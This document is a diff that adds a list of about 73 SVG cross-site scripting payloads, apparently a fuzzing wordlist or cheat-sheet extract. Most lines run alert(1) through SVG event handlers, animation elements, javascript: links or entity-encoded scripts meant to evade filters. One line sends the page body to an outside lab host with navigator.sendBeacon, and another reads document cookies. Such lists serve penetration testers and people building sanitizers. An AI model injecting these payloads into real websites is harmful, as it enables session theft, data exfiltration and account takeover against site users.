@@ -1,0 +1,73 @@
+<svg draggable="true" ondrag="alert(1)">test</svg>
+<svg draggable="true" ondragend="alert(1)">test</svg>
+<svg draggable="true" ondragenter="alert(1)">test</svg>
+<svg draggable="true" ondragleave="alert(1)">test</svg>
+<svg draggable="true" ondragstart="alert(1)">test</svg>
+<svg id=x onfocus=alert(1)>
+<svg id=x onfocusin=alert(1)>
+<svg id=x tabindex=1 onactivate=alert(1)></svg>
+<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>
+<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>
+<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>
+<svg onafterscriptexecute=alert(1)><script>1</script>
+<svg onbeforecopy="alert(1)" contenteditable>test</svg>
+<svg onbeforecut="alert(1)" contenteditable>test</svg>
+<svg onbeforepaste="alert(1)" contenteditable>test</svg>
+<svg onbeforescriptexecute=alert(1)><script>1</script>
+<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg onclick="alert(1)">test</svg>
+<svg oncontextmenu="alert(1)">test</svg>
+<svg oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<svg oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<svg ondblclick="alert(1)" autofocus tabindex=1>test</svg>
+<svg onfocusout=alert(1) tabindex=1 id=x></svg><input autofocus>
+<svg onkeydown="alert(1)" contenteditable>test</svg>
+<svg onkeypress="alert(1)" contenteditable>test</svg>
+<svg onkeyup="alert(1)" contenteditable>test</svg>
+<svg onload=alert(1)>
+<svg onmousedown="alert(1)">test</svg>
+<svg onmouseenter="alert(1)">test</svg>
+<svg onmouseleave="alert(1)">test</svg>
+<svg onmousemove="alert(1)">test</svg>
+<svg onmouseout="alert(1)">test</svg>
+<svg onmouseover="alert(1)">test</svg>
+<svg onmouseup="alert(1)">test</svg>
+<svg onmousewheel=alert(1)>requires scrolling
+<svg onpaste="alert(1)" contenteditable>test</svg>
+<svg onpointerdown=alert(1)>XSS</svg>
+<svg onpointerenter=alert(1)>XSS</svg>
+<svg onpointerleave=alert(1)>XSS</svg>
+<svg onpointermove=alert(1)>XSS</svg>
+<svg onpointerout=alert(1)>XSS</svg>
+<svg onpointerover=alert(1)>XSS</svg>
+<svg onpointerrawupdate=alert(1)>XSS</svg>
+<svg onpointerup=alert(1)>XSS</svg>
+<svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
+<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>
+<svg><image href=1 onerror=alert(1)>
+<svg><image href=validimage.png onload=alert(1)>
+<svg><path><animateMotion onbegin=alert(1) dur="1s" repeatCount="1">
+<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>
+<svg><path><animateMotion onrepeat=alert(1) dur="1s" repeatCount="2">
+<svg><set onbegin=alert(1) attributename=x dur=1s>
+<svg><set onend=alert(1) attributename=x dur=1s>
+<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
+<svg><a><animate+attributeName%3Dhref+values%3Djavascript%3Aalert(document.cookies)+%2F><text+x%3D20+y%3D20>Click me<%2Ftext><%2Fa>
+<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><script href="data:text/javascript,alert(1)" />
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
+<svg><script>&#97;lert(1)</script></svg>
+<svg><script>&#x61;lert(1)</script></svg>
+<svg><script>alert&NewLine;(1)</script></svg>
+<svg><script>x="&quot;,alert(1)//";</script></svg>
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>
+<svg@load=this.alert(1)>
